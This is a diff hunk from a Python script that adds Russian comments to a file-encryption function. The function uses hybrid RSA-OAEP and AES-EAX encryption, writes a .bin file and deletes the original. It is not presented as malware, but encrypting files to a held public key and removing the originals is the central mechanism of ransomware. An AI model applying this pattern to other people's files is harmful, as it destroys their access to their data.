@@ -106,17 +106,17 @@ def encrypt(dest):#Получение файла для шифровки в фу
             public_rsa = RSA.import_key(open('public.pem').read()) #импорт и сохранение публичного ключа в переменной
             session_key = get_random_bytes(16) #Генерация 16-байтовый случайный ключ и сохранение его в объекте
 
-            chips_rsa = PKCS1_OAEP.new(public_rsa)
-            enc_session_key = chips_rsa.encrypt(session_key)
+            chips_rsa = PKCS1_OAEP.new(public_rsa) #Создание объекта для шифрования по схеме PKCS1_OAEP с ключом public_rsa
+            enc_session_key = chips_rsa.encrypt(session_key)#шифрование ключа сеанса и сохранение его в объекте enc_session_key
 
-            chips_aes = AES.new(session_key, AES.MODE_EAX)
-            chips_text, tag = chips_aes.encrypt_and_digest(data_enc)
+            chips_aes = AES.new(session_key, AES.MODE_EAX) #Создание объекта для шифрования файлов aes в режиме eax с ключом сеанса
+            chips_text, tag = chips_aes.encrypt_and_digest(data_enc)#Шифрование содержимого файла с помощью aes и сохранения зашифрованных данных в chips_text
 
-            file_name, _ = os.path.splitext(os.path.basename(dest))
-            encrypted_file_name = file_name + '.bin'
+            file_name, _ = os.path.splitext(os.path.basename(dest))#Извлечение имени файла без разширения
+            encrypted_file_name = file_name + '.bin' #Добавление bin к имени зашифрованного файла
 
-            with open(os.path.join(os.path.dirname(dest), encrypted_file_name), 'wb') as file_out:
-                for x in (enc_session_key, chips_aes.nonce, tag, chips_text):
+            with open(os.path.join(os.path.dirname(dest), encrypted_file_name), 'wb') as file_out: #Открытие файла в директории исходного файла
+                for x in (enc_session_key, chips_aes.nonce, tag, chips_text):#записывает по порядку зашифрованный ключ сеанса, случайное число инициализации (nonce) для AES, MAC и зашифрованные данные файла в открытый файл.
                     file_out.write(x)
             print(f'{dest} зашифрован')
             os.remove(dest)
